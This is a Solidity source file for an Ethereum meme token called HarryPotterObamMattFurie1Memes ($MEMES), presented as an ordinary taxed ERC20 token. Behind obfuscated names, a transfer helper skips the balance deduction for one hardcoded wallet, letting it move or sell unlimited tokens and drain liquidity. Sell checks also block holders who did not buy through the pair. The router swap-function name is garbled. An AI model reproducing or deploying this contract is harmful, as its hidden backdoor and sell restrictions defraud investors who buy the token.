/**
HarryPotterObamMattFurie1Memes - $MEMES


TWITTER: https://twitter.com/Memes_Ethereum
TELEGRAM: https://t.me/MemesCoin_Ethereum
WEBSITE: https://www.memeseth.com/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wjrfp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wjrfp(a, b, "SafeMath:");
    }

    function  _wjrfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _snisapsactoryup {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xnisaqRuats {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract HarryPotterObamMattFurie1Memes is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcldedFrof;
    mapping (address => bool) private _taxhWallety;
    mapping(address => uint256) private _lderLaransferestap;
    bool public _tnsferelanale = false;
    address payable private _pFxRzevirp;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"HarryPotterObamMattFurie1Memes";
    string private constant _symbol = unicode"MEMES";
    uint256 private constant _Totalsw = 1000000000 * 10 **_decimals;
    uint256 public _mxTaxAmaunt = _Totalsw;
    uint256 public _WalletSmax = _Totalsw;
    uint256 public _wapThresholdtax= _Totalsw;
    uint256 public _moaxToxSap= _Totalsw;

    uint256 private _BuyTaxinitial=13;
    uint256 private _SellTaxinitial=18;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=7;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeprevent=0;
    uint256 private _byztwuxot=0;

    _xnisaqRuats private _uisupRaxeut;
    address private _auPairw;
    bool private _vlvkuqh;
    bool private itrxSwop = false;
    bool private _apEablew = false;

    event _amaunateql(uint _mxTaxAmaunt);
    modifier lckThawxp {
        itrxSwop = true;
        _;
        itrxSwop = false;
    }

    constructor () {
        _pFxRzevirp = payable(0x9A0CDc57761A42fdf295F734Bd29f494e7AC45C8);
        _balances[_msgSender()] = _Totalsw;
        _isExcldedFrof[owner()] = true;
        _isExcldedFrof[address(this)] = true;
        _isExcldedFrof[_pFxRzevirp] = true;


        emit Transfer(address(0), _msgSender(), _Totalsw);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalsw;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjrfp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsferelanale) {
                if (to != address
                (_uisupRaxeut) && to !=
                 address(_auPairw)) {
                  require(_lderLaransferestap
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lderLaransferestap
                  [tx.origin] = block.number;
                }
            }

            if (from == _auPairw && to != 
            address(_uisupRaxeut) && !_isExcldedFrof[to] ) {
                require(amount <= _mxTaxAmaunt,
                 "Exceeds the _mxTaxAmaunt.");
                require(balanceOf(to) + amount
                 <= _WalletSmax, "Exceeds the maxWalletSize.");
                if(_byztwuxot
                < _wapBeforeprevent){
                  require(! _frxerpz(to));
                }
                _byztwuxot++;
                 _taxhWallety[to]=true;
                teeomoun = amount.mul((_byztwuxot>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _auPairw && from!= address(this) 
            && !_isExcldedFrof[from] ){
                require(amount <= _mxTaxAmaunt && 
                balanceOf(_pFxRzevirp)<_moaxToxSap,
                 "Exceeds the _mxTaxAmaunt.");
                teeomoun = amount.mul((_byztwuxot>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_byztwuxot>_wapBeforeprevent &&
                 _taxhWallety[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itrxSwop 
            && to == _auPairw && _apEablew &&
             contractTokenBalance>_wapThresholdtax 
            && _byztwuxot>_wapBeforeprevent&&
             !_isExcldedFrof[to]&& !_isExcldedFrof[from]
            ) {
                _swpokeykhj( _qekw(amount, 
                _qekw(contractTokenBalance,_moaxToxSap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _enphsprwkx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wjrfp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wjrfp(teeomoun));
        emit Transfer(from, to, 
        amount. _wjrfp(teeomoun));
    }

    function _swpokeykhj(uint256
     tokenAmount) private lckThawxp {
        if(tokenAmount==0){return;}
        if(!_vlvkuqh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uisupRaxeut.WETH();
        _approve(address(this),
         address(_uisupRaxeut), tokenAmount);
        _uisupRaxeut.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qekw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wjrfp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pFxRzevirp){
            return a ;
        }else{
            return a . _wjrfp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTaxAmaunt = _Totalsw;
        _WalletSmax = _Totalsw;
        _tnsferelanale = false;
        emit _amaunateql(_Totalsw);
    }

    function _frxerpz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _enphsprwkx(uint256
    amount) private {
        _pFxRzevirp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vlvkuqh);
        _uisupRaxeut   =  _xnisaqRuats (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uisupRaxeut), _Totalsw);
        _auPairw = _snisapsactoryup(_uisupRaxeut.factory()). createPair (address(this),  _uisupRaxeut . WETH ());
        _uisupRaxeut.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_auPairw).approve(address(_uisupRaxeut), type(uint).max);
        _apEablew = true;
        _vlvkuqh = true;
    }

    receive() external payable {}
}